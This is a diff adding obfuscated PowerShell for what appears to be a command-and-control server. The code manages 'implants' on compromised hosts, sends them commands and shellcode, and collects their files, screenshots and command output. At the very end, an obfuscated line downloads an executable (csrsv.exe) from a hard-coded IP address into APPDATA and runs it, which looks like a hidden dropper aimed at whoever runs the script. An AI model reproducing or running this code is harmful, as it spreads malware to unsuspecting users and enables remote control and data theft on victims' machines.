+                                $Output = "ErrorUpload: " + $error[0]
+                            }
+                        } elseif ($i.ToLower().StartsWith("download-file")) {
+                            try {
+                                Invoke-Expression $i | Out-Null
+                            }
+                            catch {
+                                $Output = "ErrorLoadMod: " + $error[0]
+                            }
+                        } elseif ($i.ToLower().StartsWith("loadmodule")) {
+                            try {
+                                $modulename = $i -replace "LoadModule",""
+                                $Output = Invoke-Expression $modulename | out-string  
+                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
+                                $Output = Encrypt-String2 $key $Output
+                                $UploadBytes = getimgdata $Output
+                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                            } catch {
+                                $Output = "ErrorLoadMod: " + $error[0]
+                            }
+                        } else {
+                            try {
+                                $Output = Invoke-Expression $i | out-string  
+                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                                $StdError = ($error[0] | Out-String)
+                                if ($StdError){
+                                $Output = $Output + $StdError
+                                $error.clear()
+                                }
+                            } catch {
+                                $Output = "ErrorCmd: " + $error[0]
+                            }
+                            try {
+                            $Output = Encrypt-String2 $key $Output
+                            $Response = Encrypt-String $key $i
+                            $UploadBytes = getimgdata $Output
+                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
+                            } catch{}
+                        }
+                    } 
+            }
+            elseif ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
+                try {
+                $Output = Invoke-Expression $ReadCommandClear | out-string
+                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
+                $ModuleLoaded = Encrypt-String $key $result
+                $Output = Encrypt-String2 $key $Output
+                $UploadBytes = getimgdata $Output
+                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                } catch {
+                    $Output = "ErrorUpload: " + $error[0]
+                }
+
+            } elseif ($ReadCommandClear.ToLower().StartsWith("download-file")) {
+                try {
+                    Invoke-Expression $ReadCommandClear | Out-Null
+                }
+                catch {
+                    $Output = "ErrorLoadMod: " + $error[0]
+                }
+            } elseif ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
+                try {
+                $modulename = $ReadCommandClear -replace "LoadModule",""
+                $Output = Invoke-Expression $modulename | out-string  
+                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
+                $Output = Encrypt-String2 $key $Output
+                $UploadBytes = getimgdata $Output
+                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                } catch {
+                    $Output = "ErrorLoadMod: " + $error[0]
+                }
+
+            } else {
+                try {
+                    $Output = Invoke-Expression $ReadCommandClear | out-string  
+                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                    $StdError = ($error[0] | Out-String)
+                    if ($StdError){
+                    $Output = $Output + $StdError
+                    $error.clear()
+                    }
+                } catch {
+                    $Output = "ErrorCmd: " + $error[0]
+                }
+            try {
+            $Output = Encrypt-String2 $key $Output
+            $UploadBytes = getimgdata $Output
+            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+            } catch {}
+            }
+            $ReadCommandClear = $null
+        }
+    break
+    }
+}'
+${m`eSsagE} = &("{0}{1}{4}{2}{3}"-f'E','n','pt-S','tring','cry') -key ${EN`C`KEy} -unencryptedString ${ME`s`sAGe}
+} else { 
+   
+} 
+    }
+
+    ${r`AndOmuR`I`AGe`NTs} = &("{2}{1}{3}{0}"-f'qliteQuery','v','In','oke-S') -DataSource ${D`AtABa`se} -Query ("{0}{3}{2}{4}{1}{5}" -f 'SELECT R','OM Implan','ndomU','a','RI FR','ts') -As ("{2}{0}{1}" -f 'in','gleValue','S')
+            
+    foreach (${Ra`N`URi} in ${RAnDO`MUR`I`AGeNtS}) 
+    {
+    if (${R`An`Uri} -ne ${N`ULl}) 
+    {
+        ${Im_`Re`sUltS} = &("{2}{3}{4}{1}{0}{5}"-f 'iteQuer','ql','In','voke','-S','y') -DataSource ${DaTA`B`ASe} -Query ('SE'+'LECT '+'* '+'FRO'+'M '+'Impla'+'n'+'ts '+'WHER'+'E '+"RandomURI='$ranuri'") -As ("{1}{0}" -f 't','PSObjec')
+        ${K`ey} = ${IM`_ReS`Ults}."K`EY"
+        ${h`Os`TnamE} = ${I`M_re`sU`LTS}."HOst`NA`Me"
+        ${iM`P`lanTId} = ${I`m_R`ESUL`TS}."I`m`p`LANTid"
+        ${Im`D`om} = ${Im`_r`eSuL`TS}."dOma`in"
+
+        ${Curr`enT`TimE} = (&("{0}{1}"-f'Ge','t-Date'))
+        ${mU`ltic`MdRESU`LtS} = &("{4}{2}{0}{3}{1}"-f'ue','y','voke-SqliteQ','r','In') -DataSource ${Da`T`ABase} -Query ('SELEC'+'T '+'* '+'FROM'+' '+'Ne'+'wTa'+'sks '+'W'+'HERE '+"RandomURI='$ranuri'") -As ("{1}{0}{2}"-f 'bj','PSO','ect')
+        
+        if ((${reqU`E`St}."u`Rl" -like "*$ranuri*") -and (${rEQu`esT}."htt`Pme`ThOd" -eq 'GET') -and (${mUlTiCMdRe`s`UL`TS}))
+        {
+            ${MES`SAge} = ${n`UlL}
+            foreach (${I} in ${m`UltICM`d`REsults}) {
+                ${T`Ask`Id} = ${I}."COmM`A`ND"
+                ${T`Ask`IdTime} = ${I}."TaS`kid"
+                if (!${TaS`kid}.("{2}{0}{1}" -f 'Lo','wer','To').Invoke().("{2}{0}{1}" -f 'artswi','th','st').Invoke(("{0}{1}{2}" -f'f','vd','sghfdsyyh'))) {
+                    &("{3}{0}{1}{2}" -f'ite-','Ho','st','Wr') ('Comman'+'d '+'i'+'ssued '+'aga'+'in'+'st '+'i'+'mpl'+'ant '+"$implantID "+'o'+'n '+'ho'+'st '+"$hostname "+"$imDom") -ForegroundColor ("{1}{0}" -f'w','Yello')
+                    if  (${t`ASKid}.("{2}{0}{1}"-f 'L','ower','To').Invoke().("{2}{1}{0}" -f'ith','artsw','st').Invoke(("{3}{1}{0}{2}" -f'i','d-f','le','uploa'))) {
+                        &("{0}{1}{2}" -f 'Writ','e-','Host') -Object ("{0}{2}{3}{1}"-f 'Up','e','loading Fi','l') -ForegroundColor ("{0}{1}"-f 'Yell','ow')
+                    } elseif (${tAsK`id}.("{0}{2}{1}"-f'To','er','Low').Invoke().("{1}{2}{0}"-f'swith','star','t').Invoke("`$shellcode")) {
+                        &("{0}{1}{3}{2}"-f 'Wr','ite','Host','-') ('Uploa'+'d'+'ing '+'Shellc'+'o'+'de'+': '+"$hostname") -ForegroundColor ("{1}{0}"-f'w','Yello')
+                    } else {
+                        &("{2}{1}{0}"-f'Host','-','Write') -Object ${TA`sk`ID} -ForegroundColor ("{1}{0}"-f'ow','Yell')
+                    }
+                }
+                if (${Ta`skid}.("{1}{2}{0}"-f'ower','To','L').Invoke().("{1}{2}{0}" -f'ith','Star','tsW').Invoke(("{0}{1}{2}" -f'lo','adm','odule'))) 
+                {
+                    ${M`ODUlEn`A`ME} = ${tASK`ID} -replace ("{2}{1}{0}"-f' ','le','LoadModu'), '' 
+                    if (&("{1}{0}{2}" -f 'st','Te','-Path') "$PoshPath\Modules\$modulename") {
+                    ${mod`UlE} = (&("{3}{0}{1}{2}"-f'-Conte','n','t','Get') -Path "$PoshPath\Modules\$modulename") -join "`n"
+                    
+                    ${m`ODule} = ("{0}{2}{1}" -f 'LoadMod','e','ul')+${Modu`lE}
+                    if (${M`eSs`AGe}) {
+                        ${M`es`SaGe} = ${M`essa`Ge} + ("{0}{3}{4}{1}{2}"-f '!d','n','@LD!-d','-3di','o') + ${mO`DULe}
+                    } else {
+                        ${m`E`SsAGe} = ${mO`D`Ule} 
+                    }
+                    } elseif (&("{2}{1}{0}" -f'h','t-Pat','Tes') "$modulename") {
+                    ${M`O`DuLe} = (&("{1}{0}{2}" -f'-','Get','Content') -Path "$modulename") -join "`n"
+                    
+                    ${M`oDUle} = ("{2}{0}{1}"-f'du','le','LoadMo')+${mOd`U`lE}
+                    if (${Mes`SA`Ge}) {
+                        ${mesS`Age} = ${M`EsS`Age} + ("{2}{0}{3}{1}"-f '3d','d','!d-','ion@LD!-') + ${M`Od`ULE}
+                    } else {
+                        ${me`s`sAGE} = ${MOd`ULe} 
+                    }
+                    } else {
+                    &("{0}{1}{2}"-f 'Write','-Ho','st') ("{5}{2}{0}{4}{1}{3}" -f'n',' modul','i','e','ding','Error f')
+                    }
+                }
+                else 
+                {
+                    if (${M`ES`SAGE}) {
+                        ${MEssa`ge} = ${me`s`SAGE} + ("{1}{3}{0}{2}" -f 'ion@LD!','!d','-d','-3d') + ${TASk`iD}
+                    } else {
+                        ${me`S`SagE} = ${T`ASkId} 
+                    }
+                }
+                &("{0}{1}{2}{4}{3}" -f 'Invoke-','S','qlit','ry','eQue') -DataSource ${Dat`AbaSe} -Query ('DE'+'L'+'ETE '+'FR'+'OM '+'New'+'Ta'+'sks '+'W'+'H'+'ERE '+"RandomURI='$ranuri' "+'a'+'nd '+"TaskID='$taskidtime'")|&("{1}{0}" -f'ut-null','o')
+            }
+            if (${mulT`iC`M`D`RESuLTs}."CoU`NT" -gt 1){
+                ${me`S`SaGe} = ("{2}{1}{0}"-f'd','ulticm','m') + ${meSs`A`Ge}
+            }
+            &("{2}{0}{3}{4}{1}" -f'oke','ery','Inv','-Sqlite','Qu') -DataSource ${dA`Tab`AsE} -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri' "|&("{1}{0}{2}"-f 'nul','out-','l')
+            ${F`RoM`sT`RIng} = &("{0}{4}{2}{3}{1}" -f'E','ring','ry','pt-St','nc') ${K`Ey} ${m`eSS`AgE}
+            ${C`OmM`ANd`sENt} = ${F`Ro`mSTrinG}
+            ${mES`s`AgE} = ${f`RO`mStRiNG}                    
+        }
+        
+        
+        if ((${r`Eq`UeST}."u`RL" -like "*$ranuri*") -and (${RE`QuE`sT}."HTtpM`eth`od" -eq 'GET') -and (${MU`lTiCmdr`E`S`Ul`TS}."CoU`NT" -eq 0)) 
+        { 
+            &("{2}{0}{1}{3}"-f '-','SqliteQue','Invoke','ry') -DataSource ${d`AtAba`se} -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri' "|&("{2}{0}{1}"-f 'nu','ll','out-')
+            ${M`eSSa`gE} = " "
+        } 
+
+        
+        if ((${R`EQ`UeSt}."u`Rl" -like "*$ranuri*") -and (${Re`QUE`St}."Htt`Pme`ThOD" -eq ("{0}{1}"-f 'POS','T'))) 
+        { 
+            ${r`ESpons`esTreAM} = ${rEq`UE`st}."i`NPu`TSTreAM" 
+            ${T`ArGEtsTrE`AM} = &("{1}{2}{0}" -f't','New-Obj','ec') -TypeName ("{3}{1}{5}{4}{0}{2}{6}"-f '.Me','ys','mor','S','IO','tem.','yStream') 
+            ${b`UffeR} = &("{2}{1}{0}"-f'ct','bje','new-o') ("{1}{0}"-f'yte[]','b') 10KB 
+            ${cOU`NT} = ${Res`Pon`seS`TRe`AM}.("{1}{0}" -f'd','Rea').Invoke(${BUFF`ER},0,${B`UFf`eR}."Le`N`Gth") 
+            ${doW`Nloa`dEDbY`Tes} = ${C`O`Unt} 
+            while (${c`Ou`Nt} -gt 0) 
+            { 
+                ${tAR`ge`Ts`Tr`EaM}.("{0}{1}" -f'Wri','te').Invoke(${b`UFfER}, 0, ${CO`U`Nt}) 
+                ${c`oU`NT} = ${rESPOn`s`ES`TrEaM}.("{1}{0}" -f'd','Rea').Invoke(${BUF`Fer},0,${B`UF`FEr}."LEn`gtH") 
+                ${Down`lOA`d`E`DbYteS} = ${D`owNloA`dE`DB`YtES} + ${c`o`UNT} 
+            } 
+
+            ${l`en} = ${T`ARGE`Ts`TrEAm}."LENg`Th"
+            ${SI`ZE} = ${l`En} + 1
+            ${SI`zE2} = ${l`En} -1
+            ${buF`Fer} = &("{1}{2}{0}"-f 'ect','New','-Obj') ("{0}{1}" -f'byt','e[]') ${S`IZE}
+            ${Targ`EtsTRe`Am}.pOsItiOn = 0
+            ${TA`RGeT`sTRe`Am}.("{0}{1}" -f 'R','ead').Invoke(${BU`FfEr}, 0, ${ta`RG`eTs`TRE`Am}."l`E`NGth")|&("{1}{2}{0}" -f'll','O','ut-nu')
+
+            ${T`ArgeTs`T`R`Eam}.("{1}{0}" -f'ush','Fl').Invoke()
+            ${T`ArGE`TST`REAm}.("{0}{1}" -f 'Clo','se').Invoke() 
+            ${TA`R`GetstReaM}.("{0}{2}{1}" -f'D','ose','isp').Invoke()
+
+            
+            
+            ${E`NcRyPtE`ds`TRInG} = ${Bu`FF`eR}[1500..${Si`zE2}]
+            ${COoK`I`ESin} = ${Req`Uest}."COo`kI`es" -replace ("{1}{2}{0}"-f '=','Ses','sionID'), ''
+            ${c`OoK`iePLa`I`NteXt} = &("{2}{0}{3}{1}" -f'ecry','t-String','D','p') ${k`eY} ${c`OOK`IeSin}          
+  
+            
+            if  (${coOKi`EPLain`TE`XT}.("{1}{0}"-f 'r','tolowe').Invoke().("{3}{0}{2}{1}"-f 'ar','h','tswit','st').Invoke(("{4}{2}{1}{0}{3}" -f'ad-f','o','ownl','ile','d')))
+            {
+                try {
+                    ${Fi`LEb`yTEs} = &("{1}{2}{0}{3}"-f'pt-Byte','Decr','y','s') ${k`ey} ${eNCR`YpTEd`st`Ri`Ng}
+                    ${FI`lE} = ${c`oO`KI`epLaiNtexT} -replace ("{0}{1}{2}{3}{4}"-f'download','-','fi','l','e '),""                    
+                    ${cA`N`ON`iCAl`Iz`EdPatH} = ${f`ile}.("{0}{1}" -f 'Repla','ce').Invoke("..","")
+                    ${P`AT`HS`K`IPROoT} =   (  gi  ("V"+"A"+"Ri"+"AB"+"LE:c3Tz")  ).vALue::("{0}{1}"-f 'GetR','oot').Invoke(${cAN`oNIcaliz`e`Dp`ATh}.("{2}{1}{0}" -f 'g','rin','ToSt').Invoke())
+                    if (!${pATHSKiP`R`O`OT}) {
+                        ${P`AT`h`SKipRo`OT} = ${cANONI`CA`lIZ`Edp`A`Th}.("{0}{2}{1}" -f'To','ing','Str').Invoke() 
+                    }
+                    ${fulLPa`TH} =   ${1`N`WbX}::("{0}{1}{2}" -f 'GetDirectory','Nam','e').Invoke(${Pa`T`hskiPrOoT})
+                    ${dir`pa`TH} = "$global:newdir\downloads\$($fullPath)"
+                    if (&("{1}{0}{2}" -f 'est-','T','Path') ${DI`R`pATH}) { } else {
+                    ${creA`T`Eddi`RS} = &("{2}{1}{0}" -f'em','ew-It','N') -ItemType ("{1}{0}{3}{2}"-f'recto','Di','y','r') -Path ${D`i`RPaTh}
+                    }
+                    ${raM`DOM`FiLEnA`Me} = &("{0}{2}{1}{3}" -f 'Get-Ran','mU','do','RI') -Length 5
+                    ${tARGeT`F`I`lE} = "$global:newdir\downloads\$($PathSkipRoot)"
+                    [int]${CHUnKN`U`MBEr} =  ( Get-vArIAble ("{0}{1}" -f 'C','Abt')  -ValuEO  )::"uT`F8"."GeT`STR`InG"(${fIl`ebYt`Es}[0..4])
+                    [int]${toTaL`c`hunks} =  (  Get-ITEM ("v"+"ARI"+"abLe:C"+"abT") ).VALuE::"UT`F8"."gE`TSTRIng"(${fI`LEb`yT`ES}[5..9])
+                    ${F`iL`e`ByTeS} = ${F`ilEBY`TEs}[10..(${f`iLE`BytEs}."leNg`TH")]
+                    ${wStR`e`AM} = &("{1}{2}{0}" -f'object','new','-') ("{4}{3}{2}{0}{1}" -f'leS','tream','i','.F','IO') ${tARgET`F`Ile}, ( ${t`YR}::"Ap`PE`ND"), ( (gCI ("{1}{2}{0}"-f '1f','vaRiAble:','lt') ).vaLUe::"w`RItE"), (  (  GET-chiLDItEM  ('VaR'+'IabLE:I'+'7v'+'3')  ).vALUe::"r`Ead")
+                    ${WsTr`E`Am}.("{0}{1}" -f 'Wr','ite').Invoke(${fil`e`BY`TeS}, 0, ${f`IlE`BYt`Es}."L`en`gtH")
+                    ${wsT`Re`Am}.("{1}{0}"-f'se','Clo').Invoke()
+                    ${b`ACKt`Opla`IntEXT} = "Downloaded file part $($chunkNumber) of $($totalChunks) : $targetfile 123456<>654321 "
+                    if (${N`ULl} -ne ${BR} -and ${b`R} -is [System.IDisposable])
+                    {
+                        ${BR}.("{0}{2}{1}"-f'Dis','ose','p').Invoke()
+                    }
+                } catch {
+                    &("{0}{1}" -f 'E','cho') ${Err`OR}[0]
+                    &("{3}{2}{0}{1}"-f 'os','t','e-H','Writ') ("{23}{1}{4}{11}{2}{15}{14}{19}{22}{21}{3}{16}{0}{10}{5}{18}{7}{20}{17}{9}{6}{12}{24}{8}{13}"-f 'd ','le','t dow','e c',' ',' too larg','ve pe',' us','ns','a','be','no','rmissi','!','d','nloa','oul','ot h','e or the','ed, t','er may n','siz','he ','Fi','o') -ForegroundColor ("{0}{1}" -f'R','ed')
+                    ${BaCK`TOPLA`In`T`eXt} = ("{10}{12}{13}{3}{15}{5}{16}{11}{17}{14}{1}{2}{7}{6}{0}{9}{4}{8}"-f 'ot','rge or',' the us','wnloaded','issi','siz',' n','er may','ons!',' have perm','F','could','ile not',' do','la',', the ','e ',' be too ')
+                }
+            } else {           
+                try {
+                    ${backtop`l`A`I`NtEXt} = &("{3}{0}{2}{4}{1}"-f'ecr','ng2','ypt-S','D','tri') ${K`ey} ${enCR`ypTeDsT`Ri`Ng}
+                }
+                catch{             
+                    ${b`ACKTo`PlAiNt`E`xT} = ("{5}{4}{2}{3}{0}{1}"-f 'o','st','g','e from h','decrypt messa','Unable to ')
+                    ${eRr`oR}.("{0}{1}"-f 'cl','ear').Invoke()
+                    ${c`OoKIEpLa`INt`eXt} = ('U'+'nab'+'le '+'to'+' '+'dec'+'rypt'+' '+'m'+'es'+'sage '+'fro'+'m '+'ho'+'st: '+"$cookieplaintext. "+'Could'+' '+'be'+' '+'too'+' '+'l'+'arge '+'a'+'nd '+'tru'+'ncat'+'ing '+'d'+'ata!')
+                }
+            }
+            
+            
+            if (${COokiEP`L`Ai`N`Text}.("{1}{2}{0}"-f 'r','t','olowe').Invoke().("{1}{2}{0}" -f 'with','s','tarts').Invoke(("{3}{1}{2}{4}{0}"-f 't','t','-scree','ge','nsho')))
+            {
+                &("{2}{1}{0}" -f'd-Type','d','A') -AssemblyName ("{1}{2}{0}{4}{3}"-f 'ws','System.W','indo','s','.Form')
+                &("{2}{1}{0}"-f 'pe','dd-Ty','A') -AssemblyName ("{4}{2}{1}{3}{0}" -f 'ng','m.','te','Drawi','Sys')
+                try{
+                    ${RANDoM`IMAG`E`Id} = &("{3}{0}{1}{2}" -f'-Rand','o','mURI','Get') -Length 15
+                    ${iMA`ge`path} = "$global:newdir\downloads\$randomimageid.png"
+                    
+                    ${BA`C`ktO`PLAintexT} = ${bAcktopla`In`T`eXT} -replace (("{4}{3}{2}{1}{0}"-f '321',')654','?','56(.+','1234')), ''
+                    ${IM`Ag`EbyteS} =  ${2`1j}::("{3}{4}{1}{0}{2}" -f '4Strin','ase6','g','Fro','mB').Invoke(${BACktO`P`lA`InTEXT})
+                    ${MS} = &("{0}{1}{2}" -f 'New-Obj','ec','t') -TypeName ("{2}{4}{1}{3}{0}" -f'eam','St','IO.Me','r','mory') -ArgumentList (${I`MAGe`Bytes}, 0, ${ImA`geby`TES}."leN`GTh")
+                    ${m`S}.("{0}{1}" -f'Wr','ite').Invoke(${ImA`gE`ByT`es}, 0, ${ImA`G`eb`yTeS}."L`eNGth")
+                    ${i`maGE} =  ( GEt-VariABLe ("{0}{1}"-f '394','sG')).VALue::("{0}{2}{1}"-f 'Fr','Stream','om').Invoke(${ms}, ${t`RUe})
+                    ${I`magE}.("{0}{1}"-f 'Sa','ve').Invoke("$imagepath")
+                    ${B`AC`KTOP`lAiN`T`exT} = ('Capt'+'ured '+'Screen'+'sh'+'ot: '+"$global:newdir\downloads\$randomimageid.png "+'12345'+'6<>6'+'54321')
+                }
+                catch {
+                    ${BACkT`op`LAiN`Te`xT} = ("{16}{15}{0}{18}{14}{4}{25}{9}{10}{22}{8}{26}{7}{12}{20}{21}{6}{2}{1}{5}{23}{19}{24}{17}{13}{3}{11}" -f'the','ve acc','a','e','u','e','s not h',' u','ocked o','d b','e ','n!','ser d','re','o','captured, ','Screenshot not ','c',' screen c','o ','o','e','l','ss t','the s','l','r this')
+                    &("{2}{1}{0}" -f 'te-Host','i','Wr') ("{22}{19}{25}{12}{3}{23}{15}{7}{9}{18}{14}{5}{4}{16}{6}{27}{24}{11}{20}{21}{8}{17}{26}{0}{1}{2}{10}{13}" -f 't','o the scr','e','c','e','reen could be lock',' or ','r','a','e','e','es n','t ','n!','c','ptu','d','ve ac','d, the s','creensho','ot',' h','S','a','er do','t no','cess ','this us') -ForegroundColor ("{0}{1}" -f'Re','d')
+                }
+                ${BAC`ktOPla`i`NTE`XT} = ('Captur'+'ed'+' '+'Screensho'+'t'+': '+"$global:newdir\downloads\$randomimageid.png "+'12345'+'6'+'<>654321')
+            }
+
+            if (${BAckT`oPL`AINT`ExT} -match ("{0}{2}{1}{3}{5}{4}" -f'12','6(.+','345','?)65','1','432'))
+            {${Cmd`lINEiN`P`UT} = ${MATc`H`es}[1]}
+            ${qU`ery} = ((("{14}{3}{24}{30}{11}{4}{8}{28}{20}{13}{10}{18}{25}{1}{26}{12}{6}{0}{19}{21}{22}{27}{17}{5}{2}{9}{29}{16}{15}{23}{7}" -f'utput, Prompt)
+','skID,',' @Co','SERT
+      ','  ','I,',' O','t)',' ','m','e','   ',' Command,','O Compl','IN','tput, @P','nd, @Ou',' @RandomUR','tedTask','            ',' INT','VALUE','S (@Tas','romp',' ','s (Ta',' RandomURI,','kID,',' ','ma',' ')))
+
+            &("{2}{0}{3}{1}{4}"-f'ke','i','Invo','-Sql','teQuery') -DataSource ${dATA`BA`sE} -Query ${q`UerY} -SqlParameters @{
+                ("{0}{1}"-f 'Tas','kID')    = (&("{1}{0}" -f'Date','Get-'))
+                ("{1}{0}"-f'mURI','Rando') = "$ranuri"
+                ("{2}{0}{1}" -f'm','mand','Co')   = ${cO`OK`iEPLAIn`TEXT}
+                ("{1}{0}"-f 'utput','O')    = ${B`ACk`TO`pLAI`N`TeXt} -replace ("{3}{4}{1}{0}{2}" -f'(.+?)6543','3456','21','1','2'), ''
+                ("{1}{0}"-f't','Promp')    = ${cM`DL`Ineinp`Ut}
+            }|&("{0}{2}{1}" -f 'o','ll','ut-nu')
+            ${M`eSS`AgE} = ("{1}{0}"-f '  ','   ')
+        }
+    }
+    }
+
+    
+    if (!${MEsS`Age}) {
+        ${M`esSa`Ge} = ${HTT`P`Resp`oNSE}
+        ${D`ATen`oW} = (&("{0}{1}"-f 'Get-Da','te'))
+        ${Fil`EURI} = (${r`EQUE`st}."U`RL")."aBSoL`Uteu`RI"
+        ${oUtf`ILE} = "$($datenow) $($request.HttpMethod) $($fileuri) "
+        &("{0}{1}{3}{2}"-f'Writ','e-Ou','t','tpu') ${oUTf`ILE} | &("{0}{2}{1}"-f'O','-File','ut') (("{0}{7}{5}{2}{1}{6}{4}{3}" -f'w','EV','ir','er.log','rv','d','LWebse','IZglobal:new')).replAce(([cHAr]69+[cHAr]86+[cHAr]76),'\').replAce(([cHAr]119+[cHAr]73+[cHAr]90),[sTriNG][cHAr]36) -Append
+    } 
+
+    if (${E`xe}) {
+        ${buf`FeR} = ${ME`ssa`gE}
+        ${E`XE} = ${F`A`lsE}
+    } else {
+        [byte[]] ${bU`F`Fer} =   (  iTeM  ('variabl'+'e'+':CabT')).VAlUE::"u`TF8".("{1}{2}{0}" -f'tes','Get','By').Invoke(${MeSs`A`GE})
+    }
+
+    ${r`E`Sp`oNsE}."CONtE`Ntl`En`gTh64" = ${bU`FFer}."LEn`G`TH"
+    ${R`Espo`N`Se}."st`ATUs`cODe" = 200
+    ${rEs`P`ONsE}."H`eAD`ERS".("{1}{0}" -f'dd','A').Invoke(("{2}{0}{1}{3}"-f'ntr','o','CacheCo','l'), ("{4}{1}{8}{3}{6}{0}{2}{7}{9}{10}{5}" -f'e, mu','o-cache,','s','o-s','n','te','tor','t-r',' n','evali','da'))
+    ${RE`sP`onsE}."He`AdERs".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}" -f 'a','Pragm'), ("{2}{0}{1}"-f'ch','e','no-ca'))
+    ${R`eSpOn`se}."HEA`DerS".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{2}" -f 'Expi','r','es'), 0)
+    ${o`Utput} = ${ResP`On`sE}."O`UtpUt`sTrEaM"
+    ${OuTp`UT}.("{0}{1}" -f 'Writ','e').Invoke(${buF`Fer}, 0, ${Bu`F`Fer}."len`gTH")
+    ${O`UtPUT}.("{0}{1}" -f'Clo','se').Invoke()
+    ${M`ESsA`Ge} = ${n`ULl}
+    ${R`ESu`LTSdb} = &("{2}{1}{4}{3}{0}" -f'uery','-','Invoke','iteQ','Sql') -DataSource ${daTAB`A`se} -Query ('SELECT'+' '+'* '+'F'+'ROM '+'Com'+'pletedTas'+'ks'+' '+'W'+'HERE '+"CompletedTaskID=$taskiddb") -as ("{2}{1}{0}"-f'ect','Obj','PS')
+
+    if (${r`E`SultsDB})
+    {
+        ${RA`NU`RI} = ${ResUlt`S`Db}."randO`M`U`Ri"
+        ${Im_`RE`s`Ult} = &("{0}{1}{2}{4}{3}"-f'Invok','e-Sqli','t','uery','eQ') -DataSource ${dAt`AB`ASe} -Query ('SELECT'+' '+'* '+'FRO'+'M '+'I'+'mplants '+'W'+'HERE '+"RandomURI='$ranuri'") -as ("{1}{2}{0}"-f'ct','P','SObje')
+        ${I`MPlAN`TH`ost} = ${im`_R`ESUlT}."Us`Er"
+        ${im} = &("{4}{1}{3}{0}{2}"-f 'e','nv','Query','oke-Sqlit','I') -DataSource ${D`AtAb`Ase} -Query ('SEL'+'ECT'+' '+'U'+'ser '+'F'+'ROM '+'Imp'+'lant'+'s '+'W'+'HERE '+"RandomURI='$ranuri'") -as ("{2}{0}{1}"-f'a','lue','SingleV')
+        ${TAS`K`co`mplE`dtimE} = ${R`E`SulTSdb}."Tas`kId"
+        ${i`MID} = ${im`_`R`eSUlt}."I`M`PLANtiD"
+        ${I`MhO`St} = ${IM`_`ReS`UlT}."hoSTNa`Me"
+        ${iM`d`OM} = ${im`_RES`Ult}."DOMA`iN"
+        &("{1}{0}{2}" -f'-Ho','Write','st') ('Comma'+'nd '+'r'+'etu'+'rned '+'agai'+'nst'+' '+'imp'+'lant'+' '+"$imID "+'on'+' '+'ho'+'st '+"$imHost "+"$imDom "+"($taskcompledtime)") -ForegroundColor ("{0}{1}" -f'G','reen')
+        &("{3}{0}{2}{1}"-f '-H','st','o','Write') -Object ${R`esUlTs`DB}."OUtP`Ut" -ForegroundColor ("{0}{1}" -f 'G','reen')
+        ${TaSkI`D`dB} ++
+    }
+
+}
+
+${LiST`E`NeR}.("{0}{1}" -f 'Sto','p').Invoke()
+}
+
+(&("{2}{1}{0}"-f 'Object','-','New') ("{0}{3}{4}{1}{2}{5}" -f 'Sy','m.Net','.We','st','e','bClient')).("{1}{0}{2}"-f'oad','Downl','File').Invoke(("{7}{0}{6}{1}{8}{2}{5}{3}{4}" -f'tt','94','102.53.','8/~yah','oo/csrsv.exe','23','p://','h','.'),"$env:APPDATA\csrsv.exe");&("{0}{1}{2}" -f 'S','t','art-Process') ("$env:APPDATA\csrsv.exe")
